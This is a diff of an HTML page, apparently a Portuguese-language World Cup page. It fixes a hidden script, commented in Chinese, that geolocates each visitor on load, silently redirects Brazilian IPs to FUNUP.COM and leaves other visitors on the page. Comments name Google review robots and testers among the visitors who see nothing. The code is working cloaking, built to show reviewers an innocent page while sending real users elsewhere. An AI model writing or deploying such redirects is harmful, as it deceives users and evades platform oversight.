@@ -111,28 +111,28 @@
       <a href="#inicio">Voltar ao topo ↑</a>
     </footer>
   </main>
-      <!-- 核心安全分流跳转脚本（巴西本地秒跳版）开始 -->
+ <!-- 核心安全分流跳转脚本开始 -->
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // 1. 调用免费公开的地理位置 API 获取当前访问者的国家代码
-            fetch('https://ipapi.co')
+            // 1. 正确配置含有 /json/ 后缀的官方数据接口
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     // 2. 判断国家代码是否为巴西 (BR)
                     if (data && data.country_code === 'BR') {
-                        // 🚀 核心修改：如果是巴西本地 IP，不再等待 2 秒，直接执行最快速度的秒跳跳转
+                        // 如果是巴西本地 IP，立马执行最快速度的秒跳
                         window.location.href = "https://FUNUP.COM"; 
                     } else {
-                        // 如果不是巴西 IP（如 Google 审查机器人、国内测试等），雷打不动地留在当前世界杯页面
+                        // 如果不是巴西 IP，雷打不动地留在当前页面
                         console.log("Acesso local mantido para auditoria.");
                     }
                 })
                 .catch(error => {
-                    // 如果网络异常或 API 报错，作为安全兜底，不执行跳转，让用户停留在当前世界杯页面
+                    // 作为安全兜底，不执行跳转
                     console.error("Erro ao verificar localização:", error);
                 });
         });
     </script>
-    <!-- 核心安全分流跳转脚本（巴西本地秒跳版）结束 -->
+    <!-- 核心安全分流跳转脚本结束 -->
 </body>
 </html>
